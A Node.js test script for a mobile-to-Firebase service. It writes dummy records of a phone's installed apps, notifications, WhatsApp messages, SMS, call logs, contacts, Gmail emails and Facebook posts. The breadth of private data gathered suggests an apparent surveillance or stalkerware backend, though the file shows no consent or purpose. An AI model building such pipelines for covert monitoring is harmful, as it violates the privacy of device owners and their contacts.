const mobileFirebaseService = require('./services/mobileFirebaseService');

async function testMobileFirebase() {
  console.log('🧪 Testing Mobile Firebase Service...\n');

  try {
    // Test device info storage
    console.log('1. Testing device info storage...');
    const deviceInfo = {
      deviceId: 'test-device-123',
      manufacturer: 'Samsung',
      model: 'Galaxy S23',
      androidVersion: '13',
      sdkVersion: '33',
      timestamp: new Date().toISOString()
    };
    
    const deviceResult = await mobileFirebaseService.storeDeviceInfo(deviceInfo);
    console.log('✅ Device info stored:', deviceResult);

    // Test apps list storage
    console.log('\n2. Testing apps list storage...');
    const appsData = {
      deviceId: 'test-device-123',
      apps: [
        { packageName: 'com.whatsapp', appName: 'WhatsApp' },
        { packageName: 'com.facebook.katana', appName: 'Facebook' },
        { packageName: 'com.instagram.android', appName: 'Instagram' }
      ]
    };
    
    const appsResult = await mobileFirebaseService.storeAppsList(appsData);
    console.log('✅ Apps list stored:', appsResult);

    // Test notification storage
    console.log('\n3. Testing notification storage...');
    const notificationData = {
      deviceId: 'test-device-123',
      title: 'Test Notification',
      body: 'This is a test notification from mobile app',
      appName: 'Test App',
      packageName: 'com.test.app',
      deviceInfo: { battery: 85, wifi: true },
      notificationData: { priority: 'high' }
    };
    
    const notificationResult = await mobileFirebaseService.storeNotification(notificationData);
    console.log('✅ Notification stored:', notificationResult);

    // Test batch notifications
    console.log('\n4. Testing batch notifications...');
    const batchNotifications = [
      {
        deviceId: 'test-device-123',
        title: 'Batch Notification 1',
        body: 'First batch notification',
        appName: 'Test App',
        packageName: 'com.test.app'
      },
      {
        deviceId: 'test-device-123',
        title: 'Batch Notification 2',
        body: 'Second batch notification',
        appName: 'Test App',
        packageName: 'com.test.app'
      }
    ];
    
    const batchResult = await mobileFirebaseService.storeBatchNotifications(batchNotifications, 'test-device-123');
    console.log('✅ Batch notifications stored:', batchResult);

    // Test WhatsApp data storage
    console.log('\n5. Testing WhatsApp data storage...');
    const whatsappData = {
      deviceInfo: { deviceId: 'test-device-123', timestamp: Date.now() },
      messages: [
        { id: 'msg1', text: 'Hello', sender: 'John', timestamp: Date.now() },
        { id: 'msg2', text: 'Hi there', sender: 'Jane', timestamp: Date.now() }
      ],
      contacts: [
        { id: 'contact1', name: 'John Doe', phone: '+1234567890' },
        { id: 'contact2', name: 'Jane Smith', phone: '+0987654321' }
      ],
      businessData: []
    };
    
    const whatsappResult = await mobileFirebaseService.storeWhatsAppData(whatsappData);
    console.log('✅ WhatsApp data stored:', whatsappResult);

    // Test contacts storage
    console.log('\n6. Testing contacts storage...');
    const contactsData = {
      deviceId: 'test-device-123',
      contacts: [
        { id: 'contact1', name: 'John Doe', hasPhone: true, phoneNumbers: ['+1234567890'] },
        { id: 'contact2', name: 'Jane Smith', hasPhone: true, phoneNumbers: ['+0987654321'] }
      ],
      timestamp: Date.now()
    };
    
    const contactsResult = await mobileFirebaseService.storeContacts(contactsData);
    console.log('✅ Contacts stored:', contactsResult);

    // Test SMS storage
    console.log('\n7. Testing SMS storage...');
    const smsData = {
      deviceId: 'test-device-123',
      messages: [
        { address: '+1234567890', body: 'Hello from SMS', date: Date.now(), type: 'inbox' },
        { address: '+0987654321', body: 'Hi there', date: Date.now(), type: 'sent' }
      ],
      timestamp: Date.now()
    };
    
    const smsResult = await mobileFirebaseService.storeSMS(smsData);
    console.log('✅ SMS messages stored:', smsResult);

    // Test call logs storage
    console.log('\n8. Testing call logs storage...');
    const callLogsData = {
      deviceId: 'test-device-123',
      callLogs: [
        { number: '+1234567890', type: 'incoming', date: Date.now(), duration: 120, name: 'John Doe' },
        { number: '+0987654321', type: 'outgoing', date: Date.now(), duration: 60, name: 'Jane Smith' }
      ],
      timestamp: Date.now()
    };
    
    const callLogsResult = await mobileFirebaseService.storeCallLogs(callLogsData);
    console.log('✅ Call logs stored:', callLogsResult);

    // Test Gmail data storage
    console.log('\n9. Testing Gmail data storage...');
    const gmailData = {
      userId: 'test@example.com',
      deviceId: 'test-device-123',
      emails: [
        {
          messageId: 'msg1',
          threadId: 'thread1',
          subject: 'Test Email 1',
          from: 'sender1@example.com',
          to: 'test@example.com',
          body: 'This is a test email',
          isRead: false
        },
        {
          messageId: 'msg2',
          threadId: 'thread2',
          subject: 'Test Email 2',
          from: 'sender2@example.com',
          to: 'test@example.com',
          body: 'This is another test email',
          isRead: true
        }
      ]
    };
    
    const gmailResult = await mobileFirebaseService.storeGmailData(gmailData);
    console.log('✅ Gmail data stored:', gmailResult);

    // Test Facebook data storage
    console.log('\n10. Testing Facebook data storage...');
    const facebookData = {
      deviceId: 'test-device-123',
      dataType: 'posts',
      data: [
        { id: 'post1', content: 'Test post 1', author: 'user1' },
        { id: 'post2', content: 'Test post 2', author: 'user2' }
      ]
    };
    
    const facebookResult = await mobileFirebaseService.storeFacebookData(facebookData);
    console.log('✅ Facebook data stored:', facebookResult);

    // Test device status update
    console.log('\n11. Testing device status update...');
    await mobileFirebaseService.updateDeviceStatus('test-device-123', {
      online: true,
      battery: 85,
      wifi: true,
      lastSeen: new Date().toISOString()
    });
    console.log('✅ Device status updated');

    console.log('\n🎉 All Mobile Firebase write tests completed successfully!');
    console.log('📊 Mobile app now writes data directly to Firebase (write-only)');
    console.log('📱 Mobile app -> Firebase (write operations only)');

  } catch (error) {
    console.error('❌ Mobile Firebase test failed:', error);
    process.exit(1);
  }
}

// Run the test
testMobileFirebase(); 